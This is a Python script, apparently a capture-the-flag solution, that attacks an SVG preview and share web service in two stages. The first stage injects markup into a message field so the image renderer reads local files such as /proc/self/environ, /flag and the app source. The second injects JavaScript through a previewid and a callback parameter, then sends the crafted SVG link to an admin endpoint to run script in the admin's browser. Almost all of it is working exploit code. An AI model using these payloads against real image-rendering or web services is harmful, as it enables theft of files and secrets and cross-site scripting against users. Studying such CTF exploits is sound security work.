import base64
import json
import requests


def preview(svg_data):
    data = {
      'data': svg_data
    }
    response = requests.post('http://pwnable.org:5000/preview', data=data)
    print(response.text[:100])
    resp = json.loads(response.text)

    previewid = resp["previewid"]
    data = resp["data"]

    return resp["previewid"], resp["data"]

def share(previewid):
    data = {
      'previewid': previewid
    }
    response = requests.post('http://pwnable.org:5000/share', data=data)
    print(response.text[:100])
    resp = json.loads(response.text)

    return resp["url"]


### Stage 1: read files

# URL = "http://r0p.me/bla.svg"
# URL = "text:/etc/os-release"
# URL = "text:/proc/self/environ"
# URL = "text:/flag"
# URL = "text:/usr/share/ghostscript/9.27/Resource/Init/gs_ll3.ps"
# URL = "text:/etc/ImageMagick-6/policy.xml"
URL = "text:/app/app.py"
svg_data = '[{"type":0,"message":"Love you!"},{"type":1,"message":"[lmfao.png\\"/> <image height=\\"1600\\" width=\\"1000\\" xlink:href=\\"' + URL + '\\" /> ] "}]'
previewid, data = preview(svg_data)

svg_decoded = base64.b64decode(data.split(',')[1])
# print(svg_decoded)

url = share(previewid)
png_link = f"{url.replace('share', 'image')}/png"
svg_link = f"{url.replace('share', 'image')}/svg"
print(png_link)
print(svg_link)
# visit_png = requests.get(png_link) # Trigger the HTTP request


### Stage 2: get the flag

def admin(link):
    data = {
      'url': link
    }
    response = requests.post('http://pwnable.org:5000/SUp3r_S3cret_URL/0Nly_4dM1n_Kn0ws', data=data)
    print(response.text)

injected_previewid = """' + alert(1); b = {'c': " """
url = share(injected_previewid)
png_link = f"{url.replace('share', 'image')}/png" # This URL returns an error which we can manipulate with callback

malicious_link = f"{png_link}?callback=a='"

svg_data = '[{"type":0,"message":"Love you!"},{"type":1,"message":"[lmfao.png\\"/> <script xlink:href=\\"' + malicious_link + '\\" /> ] "}]'
previewid, data = preview(svg_data)
url = share(previewid)
svg_link = f"{url.replace('share', 'image')}/svg"

path_only = svg_link.replace('http://pwnable.org:5000', '')

admin(path_only)

